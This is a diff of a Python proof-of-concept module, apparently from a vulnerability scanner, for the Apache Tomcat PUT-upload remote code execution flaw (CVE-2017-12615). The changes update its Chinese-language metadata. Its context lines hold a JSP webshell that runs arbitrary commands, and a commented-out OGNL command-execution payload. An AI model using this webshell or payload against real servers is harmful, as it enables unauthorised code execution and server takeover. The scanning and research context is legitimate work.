@@ -9,17 +9,18 @@ import time
 
 class Vuln(ABVuln):
     vuln_id = 'Apache_Tomcat_0001' # 平台漏洞编号，留空
-    name = 'Apache Tomcat 远程代码执行' # 漏洞名称
+    name = 'Apache Tomcat远程代码执行漏洞(CNVD-2017-27472)' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
-    disclosure_date = 'Unknown'  # 漏洞公布时间
+    disclosure_date = '2017-09-20'  # 漏洞公布时间
     desc = '''
-        攻击者可以利用该漏洞，获取用户服务器上 JSP 文件的源代码，或是通过精心构造的攻击请求，向用户服务器上传恶意JSP文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险
+        Apache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。
+        Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当Tomcat运行在Windows主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，文件中的代码被服务器执行。
     ''' # 漏洞描述
-    ref = 'https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-27472' # 漏洞来源https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw
+    cnvd_id = 'CNVD-2017-27472' # cnvd漏洞编号
     cve_id = 'CVE-2017-12615' #cve编号
-    product = 'Apache Tomcat'  # 漏洞应用名称
+    product = 'Tomcat'  # 漏洞应用名称
     product_version = 'Apache Tomcat 7.0.0 - 7.0.79'  # 漏洞应用版本
 
 body = '''''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp 
@@ -38,7 +39,9 @@ class Poc(ABPoc):
         try:
             
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
-                target=self.target, vuln=self.vuln))      
+                target=self.target, vuln=self.vuln)) 
+
+            #https://github.com/Medicean/VulApps/tree/master/t/tomcat/1     
             #payload = {'debug':'command','expression':'''(#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo 92933839f1efb2da9a4799753ee8d79c').getInputStream()))'''}
             proto, rest = urllib.splittype(self.target)
             host, rest = urllib.splithost(rest)
